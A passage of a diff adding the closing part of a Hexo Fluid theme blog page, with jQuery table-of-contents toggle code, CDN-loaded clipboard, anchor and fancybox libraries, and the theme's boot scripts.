+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
